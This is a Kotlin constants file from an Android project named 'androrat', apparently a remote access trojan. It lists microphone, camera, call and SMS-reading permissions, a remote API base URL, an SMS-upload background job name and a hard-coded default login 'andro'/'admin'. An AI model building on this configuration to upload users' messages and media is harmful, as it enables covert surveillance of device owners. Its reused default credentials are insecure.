package com.ierusalem.androrat.core.utils

import android.Manifest
import android.os.Build
import com.ierusalem.androrat.core.app.AppLanguage

object Constants {

    val PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) listOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_SMS,
    ) else {
        listOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
        )
    }

    //app authentication
    const val DEFAULT_LOGIN = "andro"
    const val DEFAULT_PASSWORD = "admin"

    //*** data store ***
    const val DATA_STORE_NAME = "AppDataStore"

    const val PREFERENCE_LANGUAGE = "device_language"
    const val PREFERENCE_THEME = "device_theme"
    const val PREFERENCE_IS_LOGIN_REQUIRED = "device_require_login"
    const val PREFERENCE_LOGIN = "user_login"
    const val PREFERENCE_PASSWORD = "user_password"

    private const val ENGLISH_LOCALE = "en"
    private const val RUSSIAN_LOCALE = "ru"

    const val DEFAULT_THEME = false
    const val DEFAULT_LOCALE = ENGLISH_LOCALE

    fun getLanguageCode(language: AppLanguage): String {
        return when (language) {
            AppLanguage.English -> ENGLISH_LOCALE
            AppLanguage.Russian -> RUSSIAN_LOCALE
        }
    }

    fun getLanguageFromCode(languageCode: String): AppLanguage {
        return when (languageCode) {
            ENGLISH_LOCALE -> AppLanguage.English
            RUSSIAN_LOCALE -> AppLanguage.Russian
            else -> AppLanguage.Russian
        }
    }

    //***

    const val BASE_URL = "https://ierusalem.me/api/v1/"
    const val PERMISSION_REQUEST_WORK_NAME = "permission_request_work_name"

    const val SMS_UPLOAD_WORK_NAME = "sms_upload_work_name"

    //login
    const val MINIMUM_PASSWORD_AND_LOGIN_LENGTH = 3



}